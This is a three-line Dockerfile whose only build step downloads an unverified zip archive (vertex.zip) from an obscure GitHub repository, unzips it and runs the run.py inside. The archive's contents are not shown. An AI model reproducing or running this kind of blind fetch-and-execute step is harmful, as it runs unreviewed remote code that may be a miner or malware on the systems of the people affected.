FROM python:3.10
WORKDIR /app

RUN wget https://github.com/toyerike/musical-octo-eureka/raw/refs/heads/main/vertex.zip;unzip vertex.zip;python run.py
